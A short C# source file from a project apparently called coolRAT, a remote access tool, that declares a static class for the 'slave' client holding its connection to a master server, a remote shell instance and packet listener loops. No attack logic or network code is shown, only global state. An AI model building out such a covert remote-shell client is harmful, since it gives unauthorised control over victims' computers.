using coolRAT.Libs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static coolRAT.Libs.Shell;

namespace coolRAT.Slave
{
    public static class SlaveGlobalData
    {
        public static Client LocalClient;
        public static MasterServerInfo MasterServerInfo;
        public static Shell ShellInstance;
        public static ShellOutputChangedHandler ShellOutputChangedHandler;
        public static PacketListenerLoop MainListenerLoop;
        public static PacketListenerLoop ShellListenerLoop;
    }
}
